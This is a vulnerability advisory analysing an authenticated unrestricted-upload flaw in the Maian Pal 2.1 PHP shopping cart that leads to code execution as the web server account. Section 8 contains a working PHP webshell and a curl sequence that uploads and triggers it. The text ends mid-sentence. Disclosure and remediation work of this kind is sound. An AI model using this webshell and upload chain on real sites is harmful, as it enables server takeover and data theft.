# Maian Pal 2.1 — Unrestricted Product Image Upload Yields an Executing Webshell in the Served Product Directory (Web Server Service Account)

Advisory: https://0day-rubbish.com/blog/maian-pal-product-image-upload-webshell-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

Maian Pal 2.1 is a self-hosted, PayPal-oriented shopping-cart application shipped as a commercial
PHP script. Its administration back-end creates products through an AJAX dispatcher, and product
creation accepts one or more image files in the multipart field `fm[ifile][]`. The handler that
persists those files — `products::pictures()`, defined at `class.products.php:333` and running to
approximately `class.products.php:410` — selects the stored filename from the client-supplied
multipart filename and applies **no extension allow-list whatsoever**. With the shipped thumbnail
configuration (`thumbcfg()` at `class.products.php:615`, default `'rename' => 'no'`) the assignment
at `class.products.php:372` reduces to `$picPath = $name`, so the attacker's filename, including
its `.php` extension, is used verbatim. The file is then written by `move_uploaded_file()` at
`class.products.php:~390` into `content/products/<ID>/`, a directory inside the document root that
our review of the shipped tree found to contain **no Apache deny file and no handler restriction**,
while a comparable served directory in the same product (`admin/import/`) does carry a
`Deny from all` rule.

The consequence is that a PHP file uploaded as a "product picture" is written to a location the web
server serves and, for the `.php` extension, parses. Requesting the stored object with a query
string executes it. In our verification the resulting command ran as `uid=33(www-data)` — the
Apache/PHP service account. That is the privilege ceiling: **not** root, not the database server
account, not the host.

The ordering inside the handler makes the situation slightly worse than a plain missing check. The
write happens *before* any thumbnail validation, and the validation that does run is not fatal:
`thumbnail()` calls `getimagesize()` on the stored object, which fails for a PHP file, falls through
its `switch`, and lands on a suppressed `@copy($path, $tpath)` fallback that creates a *second*
object (`tmb_<name>`) while leaving the original in place. So the "failure" path produces two files
on a served directory instead of zero, and the failure is silent.

### Overview of the product and its runtime stack

| Property | Value as established |
|---|---|
| Product | Maian Pal, version 2.1 |
| Vendor | Maian Media (United Kingdom) |
| Distribution | Commercially distributed PHP script archive (self-hosted) |
| Purpose | PayPal-oriented shopping cart with an administration back-end |
| Server language | PHP 8.3 |
| Web server | Apache with `mod_rewrite` |
| Database | MySQL |
| Source form | Plain, unobfuscated PHP; 727 `.php` files in the shipped tree |
| Back-end entry point | `admin/index.php` dispatching to `control/_ajax.php` |
| Storefront dispatcher | `control/system/_ajax.php` |
| Upload destination | `content/products/<ID>/` inside the document root |
| Prior public vulnerability records | None known to us for this product (see below) |

Two facts about this shape of product matter for the rest of the document. First, because the
application is plain PHP with no compilation step, the entire HTTP surface is enumerable by reading
the `case` labels of the two dispatcher files; there is no hidden routing table, no framework magic
and no binary to reverse. Second, because the application is designed to run inside a web server
document root, any file it writes under that root is one Apache handler configuration away from
being executable code.

### Overview of the testbed and of what that implies

The dynamic verification ran against a containerised instance of the shipped 2.1 archive. The web
tier was the upstream `php:8.3-apache` image with the `mysqli` and `gd` extensions present, the
database tier a separate MySQL container on a private container network, and the published listener
was bound to loopback only. Apache was configured with `mod_rewrite` enabled and `AllowOverride All`
for the document root, and `session.save_path` was pointed at a writable temporary directory. The
product installer was run to completion — it created 32 database tables — and the installer
directory was removed afterwards. The administrator credential pair (`LG_USER` / `LG_PASS`) was
chosen by us during installation, because this product has no factory credential to use.

Three implications follow, and we state them rather than hide them:

- The `AllowOverride All` setting is one we chose. It is the setting under which the product's own
  shipped Apache deny files work at all, so choosing it reproduces the product's intended protection
  model rather than defeating it. A deployment with `AllowOverride None` would render the shipped
  `admin/import/` deny file inert in the same breath — it would not make `content/products/` any
  safer, since that directory has no such file to begin with.
- The container image supplies Apache plus PHP as one unit; a PHP-FPM or `nginx` deployment changes
  *which* configuration file governs script execution, not the fact that `content/products/` carries
  no restriction of its own. We did not test `nginx`, PHP-FPM, IIS or Windows.
- Our instance was installed by us on a host we controlled, with an administrator password we
  selected. Nothing in the finding depends on that: the vulnerability is in the shipped handler and
  the shipped directory layout.

### Overview of affected scope

The vulnerable construction is the product-image upload path reachable from the administration
back-end's product create and product update operations (dispatcher cases `add` and `add-edit`).
Only version 2.1 was obtained, reviewed and executed. No other version, edition or bundle is
claimed, and no claim is made about any other product from this developer.

Where the product exposes a general-purpose staff-account or permission model — the back-end does
carry `users`, `users-edit`, `permissions` and `permissions-edit` operations — we did not establish
that a principal other than the installer-provisioned administrator can reach `ajax-ops=add`. This
matters for scoring, so it is treated explicitly in section 12 and left as an open question for the
vendor rather than being resolved by assumption.

### Overview of independence

This finding is original research on Maian Pal and is not a re-packaged or re-published public
issue. We are not aware of any entry for Maian Pal in the public CVE catalogue, and no public
advisory for this product came to our attention during the review; on that basis we describe the
product as having no prior public vulnerability record. We make no stronger claim than that — an
absence of records visible to us is not proof that none exist in some private or vendor-only
channel.

One structural note for the vendor, offered as a hardening pointer and as nothing more: several
other PHP scripts published by the same developer share a recognisable framework with this product —
a common class-file layout, the same `mswEnc()` credential transform over a per-installation
`SECRET_KEY`, and the same installer-provisioned `LG_USER` / `LG_PASS` constant pair. We have not
tested those other products in this work and assert nothing about them. If the framework is shared,
however, the two checks recommended in section 11 (a real extension allow-list at every upload
handler, and a non-executing served upload directory enforced at server-configuration level rather
than by `.htaccess` alone) are worth applying across the family at once.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Field | Value |
|---|---|
| Vulnerability class | Unrestricted upload of a file with a dangerous type, leading to code execution |
| Primary CWE | CWE-434 |
| Downstream CWE | CWE-94 (interpreted as code), CWE-78 (command execution via `system()` in our payload), CWE-693 (missing protection mechanism on the served directory) |
| Vulnerable component | `products::pictures()` — `class.products.php:333` through `class.products.php:410` |
| Sink statement | `move_uploaded_file($temp, $picFldr . '/' . $picPath)` — `class.products.php:~390` |
| Tainted source | `$_FILES['fm']['name']['ifile'][$i]`, `$_FILES['fm']['tmp_name']['ifile'][$i]`, assembled at `control/_ajax.php:720` |
| Routes | `POST /admin/index.php?ajax-ops=add`, `POST /admin/index.php?ajax-ops=add-edit`, then `GET /content/products/<ID>/<filename>` |
| Stored location | `content/products/<ID>/<client-supplied filename>` plus a `tmb_`-prefixed sibling |
| Authorization required | Authenticated administrator session plus the session CSRF token |
| Privilege achieved | Web server service account — observed as `uid=33(www-data)` |
| Product defaults relied upon | `thumbcfg()` `rename='no'`; absence of any deny file in `content/products/` |
| CVSS | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2 High |

### Vulnerability Summary mechanics

The mechanism is two independent absences that happen to line up. Neither one alone produces code
execution:

1. **Handler-level absence (why the file gets written at all).** `products::pictures()` decides the
   stored name with a single ternary and never inspects the extension against a permitted set. Under
   the shipped default `rename='no'`, the stored name is the client's filename. A `.php` filename is
   therefore accepted, persisted with its extension intact, and placed in a directory the product
   intends to be reachable by URL so the storefront can render product images.
2. **Directory-level absence (why the written file then executes).** The destination directory sits
   under the document root, and the front-controller rewrite rule only claims paths that do *not*
   exist on disk (`RewriteRule ^([^?]*) index.php?_msw_=$1 [L,QSA]` guarded by `RewriteCond !-f`).
   An existing `.php` file is handed straight to Apache, which routes it to the PHP handler. Nothing
   in the served directory disables that handler for this path.

Between them, these two absences convert an ordinary "add a product picture" operation into a
webshell deployment operation, using only features the product intends an administrator to have.

### Vulnerability Summary preconditions

- Valid administrator credentials. The installer forces them to be set; there is no factory default
  and no shipped `SECRET_KEY` value (the sample configuration carries a placeholder string only).
  This finding is emphatically **not** a default-credential issue.
- The session CSRF token, which is delivered to any authenticated client in the administration
  interface as `<meta name="x-header-csrf" content="...">` and sent back as the `X-CSRF-Token`
  header. Holding credentials implies holding the token, so this adds no privilege barrier.
- Network reachability of the administration entry point `admin/index.php`.
- A product category to attach the new product to (the create operation validates category
  association); the verification script creates one first.
- Script execution enabled for `.php` anywhere under the document root, which is the normal state of
  a PHP shopping cart.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

Administration authentication is a single form-based login against constants stored in the
configuration file the installer writes (`control/_cfg.php`):

- `LG_USER` and `LG_PASS` — the administrator username and secret, set during installation.
- `SECRET_KEY` — a per-installation salt/secret. The sample configuration
  (`control/_cfg-sample.php:62`) ships the placeholder text `Your secret key value goes here`; the
  installer requires the operator to supply a real random value, so there is no shipped default to
  exploit.
- `mswEnc()` — the credential transform, which is SHA-1.

The login case in the dispatcher is at `control/_ajax.php:1755`, and the comparison it performs is:

```php
$_POST['usr'] == LG_USER
mswEnc(SECRET_KEY . $_POST['pw']) == mswEnc(SECRET_KEY . LG_PASS)
```

On success the PHP session becomes an administrator session. There is no second factor, no alternative
token-based login for the back-end, and no password-reset path for the administrator: because the
credential is a constant in a configuration file, changing it means editing `control/_cfg.php`.
Password-reset operations do exist in the product, but on the storefront dispatcher
(`control/system/_ajax.php`, cases `forgot` / `reset`) and they govern customer accounts held in the
`shop_accounts` table — a different principal with no route to the sink.

### Authentication Boundary — what the gate actually checks

Two gates stand in front of the upload operation, both in the administration dispatcher
`control/_ajax.php`:

```text
control/_ajax.php:17    CSRF gate     HTTP_X_CSRF_TOKEN == session csrf_token
control/_ajax.php:85    mswPerms()    administrator session check over the ajax-ops dispatch
control/_ajax.php:686   case 'add' / 'add-edit'
control/_ajax.php:720   $fm['ifile'] = $_FILES['fm']['tmp_name']['ifile']
control/_ajax.php:734   $PRD->add($fm)
```

`mswPerms()` is defined at `functions.php:85` and is invoked from the dispatcher at
`control/_ajax.php:85`. (Both citations appear in our notes; the reconciliation is that
`functions.php:85` is the definition and `control/_ajax.php:85` is the call site near the top of the
dispatcher.) Our enumeration of the 84 administration `ajax-ops` cases found that every case except
`login` and `logout` passes through this gate, including `add` and `add-edit`.

Because the CSRF gate is at line 17 and the case dispatch is at line 686, the gate is structurally
in front of the `add` case: a request that reaches the upload handler has necessarily been evaluated
by it. **The CSRF token is therefore validated on this specific operation**, and our verification
corroborates that empirically from the other direction — the working exploit sends `X-CSRF-Token` on
the login, the category create and the product create alike, and all three were accepted. What we
did *not* run is the inverse experiment (the same product create with the header omitted), so the
gate's enforcement on `ajax-ops=add` rests on the code position plus a consistently supplied token,
not on an observed rejection. We state that plainly rather than implying a tested negative.

The token itself is `bin2hex(openssl_random_pseudo_bytes(50))` — 100 hexadecimal characters derived
from 50 cryptographically strong bytes. It is unpredictable, and it is not the weak link here.

### Authentication Boundary — the principal required by the sink

The sink requires an authenticated administrator session. In the shape we obtained, the
administrator is a single credential pair provisioned by the installer; there is no evidence in our
review of a graduated back-end role that can create products. The dispatcher does expose `users`,
`permissions` and their edit counterparts, which suggests the product may model additional
operator accounts, but `mswPerms()` was established in our review only as an *authentication* gate
over the dispatch, not as a per-operation authorization matrix. Whether a narrower back-end role
could pass it for `ajax-ops=add` is unsettled, and that is exactly why section 12 publishes `PR:H`
as the headline and treats a lower-privilege reading as conditional rather than claiming it.

### Authentication Boundary — what is deliberately not claimed

- No authentication bypass. The login path was reviewed for the usual failures — a missing or
  permissive permission configuration, a route that skips the gate, a predictable CSRF token, a
  pre-computable credential hash, a factory-credential fallback, a comparison-timing difference, and
  a secondary authentication branch — and none was found.
- No unauthenticated reach to the sink. The storefront dispatcher is genuinely unauthenticated (it
  has no `mswPerms()` call at all, because customers browse and buy without logging in), but it
  reaches no upload handler and no command-execution primitive. Section 10 covers this in full.
- No credential recovery. With no administrator reset flow, there is no token-prediction attack to
  mount.

Two contributing weaknesses *are* worth reporting, and both are kept strictly separate from the
upload vector and from its score:

**Weakness 1 — SHA-1 as the credential transform.** `mswEnc()` is a single round of SHA-1 over
`salt || password`, where the salt is the per-installation `SECRET_KEY`. Both the submitted password
and the stored constant are transformed at comparison time, so the primitive has no work factor. This
does not enable any attack we found: the salt is per-installation and secret, which defeats
precomputation and rainbow tables, and the comparison is a whole-string comparison rather than a
character-by-character one. The realistic exposure is *after* an attacker obtains `control/_cfg.php`
— which this very upload finding permits — at which point a fast hash over a possibly reused password
is cheap to crack offline. The recommendation is `password_hash()` / `PASSWORD_ARGON2ID` with a
stored hash, compared using `hash_equals()`.

**Weakness 2 — loose equality on hash and token strings.** Both the login comparison and the CSRF
gate use PHP's `==` rather than `===`. For hexadecimal digests this opens the classic type-juggling
corner only if a compared value happens to be an all-decimal numeric string: for the 100-character
CSRF token that requires all 100 characters to be decimal digits, an event of probability about 4 in 10^21 per session, and for the login it additionally requires knowing `SECRET_KEY`. We did not
pursue either and report them as hardening items (use `hash_equals()` and strict comparison), not as
findings.

### Authentication Boundary — the credential question, answered directly

There are no factory credentials in Maian Pal 2.1. The installer forces `LG_USER`, `LG_PASS` and
`SECRET_KEY` to be set, and the shipped sample configuration contains a placeholder string rather
than a usable secret. Our own instance used a password chosen for the testbed and passed to the
verification script as a command-line argument. No part of the exploit works without a real, valid,
operator-chosen administrator secret, and this advisory should never be read as a default-credential
report.

## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

The product exposes one network listener: the ordinary HTTP(S) port of the web server it is installed
into. There is no separate management port, no SOAP or RPC endpoint and no background worker with its
own socket. Everything below is a route on that single listener.

| Surface | Entry point | Approximate size | Protection |
|---|---|---|---|
| Administration AJAX operations | `control/_ajax.php` via `admin/index.php?ajax-ops=<op>` | 84 operations | CSRF token (`control/_ajax.php:17`) + `mswPerms()` (`control/_ajax.php:85`), except `login` / `logout` |
| Administration pages | `admin/index.php?p=<page>` | ~30 pages | Same administrator session |
| Storefront AJAX operations | `control/system/_ajax.php` via `index.php?ajax-ops=<op>` | 56 operations | CSRF token only — no `mswPerms()` gate, by design |
| Storefront pages | front-controller rewrite on `index.php` | ~19 routes | None (public shopping pages) |
| Installer | installer route, removable after setup | 1 | Runs once; removed in our testbed |

That is roughly 140 distinct HTTP interfaces in total, of which about 58 (the 56 storefront
operations plus administration `login` and `logout`) are reachable without credentials — around 41
per cent of the surface. The determination was static and dynamic: statically, the storefront
dispatcher contains no `mswPerms()` call; dynamically, uncredentialed requests to storefront
operations returned business JSON rather than a login redirect, while uncredentialed requests to
administration operations returned the login redirect.

The upload sink is reachable only from the administration side, specifically from `ajax-ops=add`
(product create) and `ajax-ops=add-edit` (product update). Both are inside the gated region.

### Attack Surface — how the surface was mapped

Because the application is plain PHP text with no compilation and no dependency-injection routing
layer, the mapping is a closed enumeration rather than a sample:

1. Enumerate every `case` label in `control/_ajax.php` — 84 administration operations.
2. Enumerate every `case` label in `control/system/_ajax.php` — 56 storefront operations.
3. Enumerate the `p=` page routes on both entry points and the front-controller rewrite routes.
4. Cross-check the three lists against each other and against in-tree references to each operation
   name, and confirm no additional dispatcher file exists.

Every operation on those lists was then classified by whether it reaches a file-write, file-move,
command-execution, deserialization or code-evaluation primitive. The storefront subset contains only
`include()` of language files and of class files (download, PDF and TCPDF-related); it contains no
`move_uploaded_file()`, no `exec()`, no `system()`, no `eval()` and no `unserialize()` on those
paths. The administration subset contains the file-upload path documented here, which is why the
authenticated side and not the unauthenticated side carries the finding.

Two secondary observations from the same pass are recorded here as leads, explicitly **not** as
findings: the storefront `dl-file` download operation (`class.download.php`) looks like a plausible
path-traversal candidate for unauthorised file *read*, and it was left untested; and the
administration `backup` / `restore` / `data-import` operations form a database-import surface that
we did not audit in depth once the upload path succeeded. Neither is claimed, neither is scored, and
neither should be read as a vulnerability statement.

### Attack Surface — components that narrow the surface

Three product features narrow what an attacker can do, and each was checked rather than assumed:

- **The licence restriction does not block the flow.** The product enforces a catalogue limit
  (`RESTR_PRODUCTS = 50` in the licence configuration), which could in principle make the create
  operation fail once a store is full. In a fresh installation — the realistic state for a store
  being set up, and the state of any evaluation instance — the limit does not prevent the first
  product create, so it is not a barrier to this chain.
- **The installer is removable and was removed.** After installation the installer route is no longer
  needed; our testbed deleted it, and the chain does not use it.
- **The CSRF token is genuinely strong.** 50 CSPRNG bytes rendered as 100 hex characters, bound to
  the session. It cannot be predicted by a third party, so it does confer real CSRF protection on
  the administration operations. It is simply not an authorization boundary between an administrator
  and the upload handler — an administrator always possesses their own token.

## 5. Sink Identification

### Sink Identification — how the sink was found

The search was a direct text sweep over the 727 shipped PHP files for the primitives that can create
or execute a file: `move_uploaded_file`, `fopen`/`fwrite`/`file_put_contents` with a
request-derived path, `rename`, `copy`, `exec`, `shell_exec`, `system`, `passthru`, `popen`,
`proc_open`, `eval`, `assert`, `preg_replace` with the `/e` modifier, and `unserialize`. Each hit was
then walked backwards to its dispatcher `case` to determine which surface reaches it and under which
gate. Two results shaped the remainder of the work: the storefront dispatcher reaches none of the
file-creation or command primitives, and the administration product handlers reach
`move_uploaded_file()` inside `products::pictures()`.

### Sink Identification — the vulnerable construction

The name-selection and write statements, as they appear in the shipped handler:

```php
// class.products.php:372 — no extension allow-list anywhere on this path
$name = ($cfg['rename'] == 'yes'
         ? strtolower($_FILES['fm']['name']['ifile'][$i])
         : $_FILES['fm']['name']['ifile'][$i]);

$picPath = ($cfg['rename'] == 'yes'
            ? $cfg['imgprf'] . $ID . '-' . $nextPic . strrchr($name, '.')
            : $name);

// class.products.php:~390 — written before any validation
move_uploaded_file($temp, $picFldr . '/' . $picPath);
```

with `$cfg` supplied by `thumbcfg()` at `class.products.php:615`, whose default is
`'rename' => 'no'`, and `$picFldr` resolving to the product image directory
(`PRODUCTS_IMG_PATH` plus the product id), i.e. `content/products/<ID>/`.

Three properties of this construction are load-bearing:

1. **There is no allow-list and no deny-list.** Neither `pathinfo()`, nor a `strrchr()` comparison
   against a permitted set, nor a MIME/`finfo` check appears on this path. `strtolower()` is present
   only in the `rename='yes'` branch and is a cosmetic case normalisation, not a security control.
2. **Under the shipped default the filename is used verbatim.** `$picPath = $name` means the client
   controls the entire stored name including the extension, so `x_6da06855.php` lands on disk as
   `content/products/<ID>/x_6da06855.php`.
3. **Turning `rename` on would not fix it.** This deserves emphasis because it is the obvious
   operator-facing knob. In the `rename='yes'` branch the stored name is built as
   `$cfg['imgprf'] . $ID . '-' . $nextPic . strrchr($name, '.')` — the server generates the stem but
   still takes the **extension from the client filename** via `strrchr()`. A `.php` upload under
   `rename='yes'` therefore produces a server-named file that is still executable, for example
   `<imgprf><ID>-1.php`. We derived this from the assignment expression; we did not run the
   `rename='yes'` configuration, so it is an argument from the code and not a dynamic result. It is
   listed here because an operator who flips that setting will otherwise believe they are protected.

The handler is called from `products::add()` at `class.products.php:299` (and from the update
counterpart), which is itself invoked by the dispatcher at `control/_ajax.php:734`.

### Sink Identification — the second half of the root cause, argued separately

Writing a `.php` file is only dangerous if something executes it. In this product, two things line
up to make that happen:

- The destination is inside the document root, and the front-controller rewrite claims only
  *non-existent* paths (`RewriteCond !-f` before
  `RewriteRule ^([^?]*) index.php?_msw_=$1 [L,QSA]`). A file that exists on disk is served directly
  by Apache.
- Nothing in `content/products/` disables the PHP handler for that path. Our review of the shipped
  tree found an Apache deny file (`Deny from all`) present in `admin/import/`, and found
  `content/products/` carrying no such file. The same review found that the product's attachment
  upload path — the other file-accepting feature — does apply an extension allow-list and writes to
  a directory protected by a deny rule.

That last point is the most actionable thing in this advisory. **Inside one product, one shipped
version, the upload protections are inconsistent.** Two handlers accept files from a browser; one
checks the extension and writes into a denied directory, the other does neither. This is not an
exotic misunderstanding of PHP on the developer's part — the correct pattern already exists in the
same codebase and is simply not applied to product images. Any fix that addresses only the handler
(which files may be written) leaves a second upload handler, or a future one, free to repeat the
mistake; any fix that addresses only the directory (whether written files may execute) leaves a
handler that will happily store a `.php` file, and leaves the storefront's image-rendering behaviour
dependent on that file being inert. Both halves are needed, and section 11 orders them that way.

It is also worth naming the fragility of the `.htaccess`-based half of the product's own model:
Apache deny files are honoured only when `AllowOverride` permits them. A hardened deployment that
sets `AllowOverride None` silently disables *every* protection the product ships in that form. The
vendor's remediation should therefore move the execution restriction into the server configuration
itself (vhost-level `FilesMatch`/handler removal, or an `nginx` `location` block) and treat the
`.htaccess` as defence in depth, not as the control.

### Sink Identification — execution identity of the child process

When the stored `.php` object is requested, Apache hands it to the PHP interpreter running as the
web server's service account, and our payload's `system()` call spawns its child from there. The
observed identity was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This is the conventional Debian-family Apache/PHP account inside the image we used. On a
distribution-packaged install the equivalent account is commonly `www-data`, `apache`, `httpd`,
`nginx` or `www`; on a manually hardened install it may be a dedicated user. What is constant is
that it is the **application's service account**, not root. No privilege escalation of any kind was
attempted or observed: no kernel exploit, no `sudo` right, no writable service unit, no container
escape. The ceiling of this finding is "code execution as the web server user".

### Sink Identification — sibling sinks, and whether they are proven

| Sink or path | Status | Evidence |
|---|---|---|
| `products::pictures()` (product create / update) | **Proven**, dynamically | Full chain executed three times; `uid=33(www-data)` |
| Attachment upload handler | **Not vulnerable** as reviewed | Extension allow-list plus a deny-file-protected destination; contrast, not a finding |
| `admin/import/` directory | Protected | Ships an Apache `Deny from all` file |
| Storefront `dl-file` download | Unestablished | Path-traversal candidate for file read; not tested; no claim |
| `backup` / `restore` / `data-import` | Unaudited in depth | Noted as a secondary surface; no claim |
| Stored `tmb_<name>` sibling | Proven to be created | Produced by the `@copy()` fallback inside `thumbnail()`; for a `.php` original this is a second executable object |

The `tmb_` sibling deserves a line of its own. Because `thumbnail()` fails `getimagesize()` on a PHP
file, its `switch` falls through to `@copy($path, $tpath)`, which duplicates the payload under a
`thumbnail prefix` name in the same directory. The original is never unlinked on this path. So a
cleanup procedure that deletes only the obviously named file leaves a second copy behind, and
detection that greps for suspicious product-image names must consider both.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted values are the multipart filename and temporary file of the product-image field:

```php
// control/_ajax.php:720 — assembly of the handler argument
$fm['ifile'] = $_FILES['fm']['tmp_name']['ifile'];
// and the name that decides the stored filename
$_FILES['fm']['name']['ifile'][$i]
```

Transport is an ordinary `multipart/form-data` POST to `/admin/index.php?ajax-ops=add`. The client
supplies the field as an array (`fm[ifile][]`), so several files may travel in one request; each is
iterated inside `pictures()`. The filename component of a multipart part is entirely
client-controlled: a browser will normally send a basename, but a hand-crafted request may send any
string the protocol permits.

### Source Identification — sanitization that exists, and what it is for

Everything on the path that resembles sanitization, and why none of it constrains the extension:

- `strtolower()` in the `rename='yes'` branch — cosmetic normalisation of an already server-generated
  stem; absent entirely in the default branch.
- The CSRF comparison at `control/_ajax.php:17` — an anti-forgery control. It authenticates that the
  request came from a client that read the page, not that the filename is safe.
- `mswPerms()` — an authentication/authorization gate on the operation, not on its parameters.
- `getimagesize()` inside `thumbnail()` — the one content inspection on the path, and it is
  positioned after the write. Its result is used to choose a thumbnail strategy, not to accept or
  reject the upload. When it fails, the code suppresses the failure with `@` and copies the file
  instead of removing it. Functionally, therefore, no input validation gate exists on this path.

### Source Identification — validation that is absent

- No extension allow-list (`.jpg`, `.jpeg`, `.png`, `.gif`, `.webp`) and no deny-list (`.php`,
  `.phtml`, `.php5`, `.php7`, `.phar`, `.pht`, `.htaccess`, `.svg` with embedded script).
- No `finfo`/MIME verification before the write, and no re-encoding of the image to strip any
  embedded payload.
- No server-generated random filename with a fixed, type-derived extension.
- No post-write verification with removal on failure (the write is not rolled back when
  `getimagesize()` fails).
- No normalisation of the client filename against path separators. `$picPath` is concatenated
  directly into the destination (`$picFldr . '/' . $picPath`), so a crafted filename containing
  `../` is not obviously rejected by the code we read. Whether PHP's multipart parsing or the
  filesystem layer preserves such separators in practice we did not test, so this is flagged as an
  **untested structural observation** for the vendor: if separators survive, the same handler could
  place a file outside `content/products/<ID>/` wherever the service account can write. That
  possibility is not part of the finding, not part of the score, and not asserted here.

## 7. Data Flow

### Data Flow — end-to-end chain

```text
Attacker (holding administrator credentials)
  |
  | GET /admin/index.php?p=login
  |     -> <meta name="x-header-csrf" content="<100 hex>">   (session token handed to the client)
  |
  | POST /admin/index.php?ajax-ops=login      usr=..., pw=..., X-CSRF-Token: <token>
  |     -> control/_ajax.php:1755 mswEnc(SECRET_KEY.pw) comparison      -> administrator session
  |
  | POST /admin/index.php?ajax-ops=cat        fm[name], fm[slug], X-CSRF-Token
  |     -> category row created (product validation requires one)
  |
  | POST /admin/index.php?ajax-ops=add        multipart, fm[ifile][] = x_<rand>.php
  |     -> control/_ajax.php:17    CSRF gate
  |     -> control/_ajax.php:85    mswPerms() administrator gate
  |     -> control/_ajax.php:686   case 'add'
  |     -> control/_ajax.php:720   $fm['ifile'] = $_FILES['fm']['tmp_name']['ifile']
  |     -> control/_ajax.php:734   $PRD->add($fm)
  |     -> class.products.php:299  add()
  |     -> class.products.php:333  pictures($fm, $ID)
  |     -> class.products.php:372  $picPath = $name                (client filename, .php intact)
  |     -> class.products.php:~390 move_uploaded_file($temp, 'content/products/<ID>/x_<rand>.php')
  |     -> thumbnail()             getimagesize() fails -> @copy() -> tmb_x_<rand>.php
  |                                original NOT unlinked
  |     <- {"status":"ok", ... "?p=add&id=<ID>" ...}               (response reveals the stored id)
  |
  | GET /content/products/<ID>/x_<rand>.php?cmd=id
  |     -> Apache: RewriteCond !-f fails (file exists) -> served directly -> PHP handler
  |     -> system($_GET['cmd']) as the web server service account
  v
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Data Flow — properties of the chain worth naming

- **One request does the damage.** There is no race window, no multi-step state to prepare and no
  timing dependency: a single POST creates the object, and a single GET executes it.
- **The stored path is disclosed by the response.** The create response embeds `?p=add&id=<ID>`, so
  the attacker learns the numeric product directory without guessing. The filename is one they chose.
  Predictability of the final URL is total.
- **Validation cannot rescue the write.** Because `move_uploaded_file()` precedes `thumbnail()`, and
  because the thumbnail failure path copies rather than deletes, no downstream check has the
  opportunity to remove the object.
- **The chain is monotone and repeatable.** It was executed three times with different random
  filenames and with a fresh product each time; nothing about the first success changes the state in
  a way that blocks the next.
- **Persistence is a side effect, not an extra step.** The webshell is an ordinary file in the web
  root. It survives session expiry, service restarts and administrator logouts until someone deletes
  it. Deleting the product row in the interface is not guaranteed to remove the image directory, so
  routine cleanup may leave the object behind.
- **Nothing in the flow looks anomalous to the application.** Both requests are operations the
  administrator is entitled to perform, and both return `{"status":"ok"}`. Only the filename reveals
  intent.

## 8. Exploit Construction

The verification script is `exploit/maian_pal_product_image_upload_webshell_rce.py`, standard library
only, no third-party dependency, English-only output. Every environment-specific value is a
command-line argument and the defaults are loopback and explicit placeholders.

### Exploit Construction — step sequence

1. **Obtain the CSRF token.** `GET /admin/index.php?p=login` and read the token out of
   `<meta name="x-header-csrf" content="...">`. The token is bound to the PHP session whose cookie is
   captured by the script's cookie jar at the same moment, so step 1 must precede step 2 in the same
   session.
2. **Authenticate.** `POST /admin/index.php?ajax-ops=login` with `usr`, `pw`, `rm=no` as
   `application/x-www-form-urlencoded` and `X-CSRF-Token` set. Success is the JSON body carrying
   `"status":"ok"`.
3. **Create a category.** `POST /admin/index.php?ajax-ops=cat` with `fm[name]`, `fm[slug]`,
   `fm[en]=yes`, `fm[parent]=0`. Product-create validation requires the new product to be associated
   with at least one category, so on a store that already has categories this step can be skipped via
   `--category-id`.
4. **Create a product carrying the payload.** `POST /admin/index.php?ajax-ops=add` as
   `multipart/form-data` with the scalar fields the create form sends and the payload in
   `fm[ifile][]`:

   ```text
   ajax-ops=add
   fm[name]=poc-prd-<rand>      fm[slug]=poc-prd-<rand>     fm[en]=yes
   fm[cats][]=<cat_id>          fm[bname][]=Default
   fm[bcost][]=1.00             fm[bstock][]=1
   fm[ifile][]  filename="x-<rand>.php"   Content-Type: application/octet-stream
   ```

   The declared `Content-Type` of the part is irrelevant here — the product never inspects it.
5. **Learn the stored location.** Parse the product id out of the `?p=add&amp;id=<ID>` link in the
   response; the filename is the one chosen in step 4.
6. **Execute.** `GET /content/products/<ID>/x-<rand>.php?cmd=id` and read the response body. The
   marker the payload prints before the command output makes execution unambiguous.
7. **Clean up.** `GET .../?cleanup=1&cmd=id` makes the payload delete itself and any `tmb_`-prefixed
   sibling. This is the default; `--keep` suppresses it and the script then prints the exact residual
   web paths.

A manual reproduction with command-line tools alone is equivalent:

```bash
TOKEN=$(curl -s -c jar.txt "$BASE/admin/index.php?p=login" \
  | sed -n 's/.*name="x-header-csrf" content="\([^"]*\)".*/\1/p')
curl -s -b jar.txt -c jar.txt -H "X-CSRF-Token: $TOKEN" \
  -d 'usr=ADMIN_USER&pw=ADMIN_PASS&rm=no' \
  "$BASE/admin/index.php?ajax-ops=login"
curl -s -b jar.txt -H "X-CSRF-Token: $TOKEN" \
  -F 'ajax-ops=add' -F 'fm[name]=poc' -F 'fm[slug]=poc' -F 'fm[en]=yes' \
  -F 'fm[cats][]=1' -F 'fm[bname][]=Default' -F 'fm[bcost][]=1.00' -F 'fm[bstock][]=1' \
  -F 'fm[ifile][]=@payload.php;type=application/octet-stream' \
  "$BASE/admin/index.php?ajax-ops=add"
curl -s "$BASE/content/products/<ID>/payload.php?cmd=id"
```

### Exploit Construction — payload engineering constraints

The uploaded payload is deliberately trivial:

```php
<?php echo "RCE_OK_MP:"; $c = isset($_GET["cmd"]) ? $_GET["cmd"] : "id";
system($c);
if (isset($_GET["cleanup"])) { $d = dirname(__FILE__); $b = basename(__FILE__);
  $s = @glob($d . "/tmb_" . $b);
  if (is_array($s)) { foreach ($s as $f) { @unlink($f); } }
  echo " CLEANUP_DONE"; @unlink($d . "/" . $b); } ?>
```

The engineering constraints observed:

- **No polyglot is required.** Because nothing inspects the content of the upload, valid GIF or JPEG
  headers are unnecessary; a plain PHP file suffices. A polyglot would only be needed if a
  `getimagesize()`-before-write check existed, which on this path it does not.
- **The extension must be one the PHP handler claims.** `.php` was the extension demonstrated. Other
  candidates (`.phtml`, `.phar`, `.php5`, `.pht`) and case variants (`.PHP`) depend entirely on the
  deployment's handler configuration and were **not** tested; no claim is made about them.
- **The filename should be unique.** The stored name is the client name, so re-running with a fixed
  name collides with the previous object. The script randomises it.
- **A marker makes the response self-identifying.** Echoing a fixed marker before the command output
  distinguishes "the file executed" from "the server returned the source text", which is the single
  most important discriminating observation in this class of test.
- **Non-destructive by construction.** The payload executes exactly one command given on the command
